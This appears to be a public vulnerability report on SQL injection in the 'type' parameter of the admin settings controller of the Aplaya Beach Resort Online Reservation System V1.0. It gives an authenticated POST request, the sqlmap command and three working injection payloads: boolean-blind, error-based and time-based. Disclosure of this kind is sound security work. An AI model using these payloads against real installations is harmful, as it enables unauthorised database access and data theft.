@@ -1,0 +1,51 @@
+Vulnerability discovery author:Qianyongcun
+
+Aplaya Beach Resort Online Reservation System - SQL Injection on(admin/mod_settings/controller.php?action=add type parameter) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/aplaya-beach-resort-online-reservation-system.html 
+
+Version:V1.0
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+admin/mod_settings/controller.php
+On this page, type parameter is vulnerable to SQL Injection Attack 
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Request:
+POST /aplaya/admin/mod_settings/controller.php?action=add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 55
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
+Origin: http://localhost
+Referer: http://localhost/aplaya/admin/mod_settings/index.php?view=add
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+DESCRIPTION=++1&save=&type=About
+
+-> sqlmap -r 1.txt(above request package) --batch
+
+Output:
+---
+Parameter: type (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: DESCRIPTION=  1&save=&type=About' RLIKE (SELECT (CASE WHEN (3535=3535) THEN 0x41626f7574 ELSE 0x28 END))-- Iuco
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: DESCRIPTION=  1&save=&type=About' AND (SELECT 1555 FROM(SELECT COUNT(*),CONCAT(0x7162787171,(SELECT (ELT(1555=1555,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HiNC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: DESCRIPTION=  1&save=&type=About' AND (SELECT 8504 FROM (SELECT(SLEEP(5)))GfWx)-- BIPV
+---
+[06:52:59] [INFO] the back-end DBMS is MySQL
+
